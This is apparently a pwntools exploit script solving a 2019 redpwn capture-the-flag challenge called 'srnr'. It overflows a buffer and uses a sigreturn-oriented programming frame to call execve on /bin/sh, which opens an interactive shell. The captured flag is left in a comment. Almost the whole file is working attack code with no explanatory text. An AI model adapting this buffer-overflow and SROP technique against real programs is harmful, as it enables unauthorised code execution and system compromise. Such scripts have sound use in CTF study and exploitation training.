from pwn import *
context.update(arch="amd64")



def exploit():
	#io = remote("chall.2019.redpwn.net", 4008)
	io = process("./srnr")	
	io.recvuntil("[#] number of bytes: ")

	bin_sh = 0x400c49
	syscall = 0x0000000000400703
	get_char = 0x4005e0

	payload  = 'B'*17
	payload += p64(get_char)
	payload += p64(syscall)


	frame = SigreturnFrame(kernel="amd64") 
	frame.rax = 59 
	frame.rdi = bin_sh 
	frame.rsi = 0
	frame.rdx = 0
	frame.rsp = 0x602000
	frame.rip = syscall

	payload += str(frame)
	payload += 'D'*8
	
	
	io.sendline("0")
	io.sendline(payload)

	io.sendline("\x0f")
	io.interactive()
	io.close()

#flag{sr0p_is_fir3.||-----------------------------();<>{}[]--0081734012870871238471632974132074}

exploit()
